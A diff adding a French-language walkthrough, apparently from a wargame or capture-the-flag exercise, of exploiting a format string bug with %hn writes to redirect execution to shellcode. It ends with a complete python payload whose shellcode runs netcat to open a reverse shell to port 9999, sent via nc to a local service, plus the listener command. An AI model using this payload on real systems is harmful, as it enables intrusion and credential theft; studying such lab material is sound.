@@ -1,0 +1,28 @@
+L'objectif du Format String Bug va etre d'exploiter une des faille de snprintf.
+Cette faille viens de la non utilisation des formateurs. Les formateurs permettent d'acceder, et meme (grace a %n ) d'ecrire dans la memoire. Le fait d'utiliser printf sans chaine formatee le rend donc vulnerable.
+L'idee va donc etre d'ecrire sur eip une adresse qui nous interesse. Celle de notre shellcode dans notre cas, afin de jump dessus et de l'executer.
+
+La premiere chose a faire va etre de reperer les differentes valeurs dont nous aurons besoin. grace a un disas, on repere le close que l'on utilisera pour jump dans notre SHELLCODE.
+Pour ecrire en memoire, %n bien placee recupere l'adresse qu'on lui fourni, le nombre d'octet qui ont ete ecrit avant lui. Pour ecrire une adresse, la valeur etant trop grande, on va la diviser en deux partie. Grace a quelques test on s'apercoit que l'adresse que l'on passe a printf en debut de chaine est accessible au 5em formateur.
+On va donc avec un exploit de type :
+ADRESSE_CLOSE + (ADRESSE_CLOSE + 2) + SHELLCODE + %NB1x%5$hn%NB2x%6$hn
+
+Adresse_close sera associee a %NB1x%5$hn.
+Comme on l'a dit, l'adresse ecrite au debut est accessible au 5em formateur. d'ou le %5. Le $hn signifie : ecrit en memoire le nombre d'octet ecrit avant par valeur de 2 octets. le %NB1 correspondra a ce nombre.
+Dans le calcul de NB1, il ne faut pas oublier de prendre en compte les octet que nous avons ecrit pour les adresses et le shellcode.
+Dans la meme idee, %NB2x%6$hn correspond a adresse_close + 2, le %6 permet d'acceder a la suite par rapport a %5 et donc a adresse_close + 2.
+
+Grace a quelques test d'affichage de la memoire sur gdb, on trouve l'adresse du debut de notre shellcode (dans les nop) qui est egale a 0xbffff414.
+On va donc l'ecrire en deux partie. Comme on est sur du little endian, l'adresse doit etre ecrite a l'envers, on envoie donc d'abord la valeur correspondant a f414, puis a bfff
+
+NB1 correspondra donc a :
+decimal(f414) - taille des adresses - taille du shellcode
+= 62484 - 8 - 185
+= 62291
+par quelques calculs, on retrouve NB2 = 52203
+on obtient donc la commande :
+python -c 'print "\x48\xa0\x04\x08" + "\x4a\xa0\x04\x08" + "\x90" * 50 + "\xeb\x3c\x5e\x31\xc0\x88\x46\x0b\x88\x46\x0e\x88\x46\x16\x88\x46\x26\x88\x46\x2b\x89\x76\x2c\x8d\x5e\x0c\x89\x5e\x30\x8d\x5e\x0f\x89\x5e\x34\x8d\x5e\x17\x89\x5e\x38\x8d\x5e\x27\x89\x5e\x3c\x89\x46\x40\xb0\x0b\x89\xf3\x8d\x4e\x2c\x8d\x56\x40\xcd\x80\xe8\xbf\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x65\x74\x63\x61\x74\x23\x2d\x65\x23\x2f\x62\x69\x6e\x2f\x73\x68\x23\x31\x32\x37\x2e\x30\x30\x30\x2e\x30\x30\x30\x2e\x30\x30\x31\x23\x39\x39\x39\x39\x23\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44\x45\x45\x45\x45\x46\x46\x46\x46" + "%62291x%5$hn%52203x%6$hn"' | nc localhost 56032
+
+avant de la lancer, on ecoute le port qui nous interesse :
+nc -lvp 9999
+le shell apparait et il ne nous reste plus qu'a recuperer le mot de passe
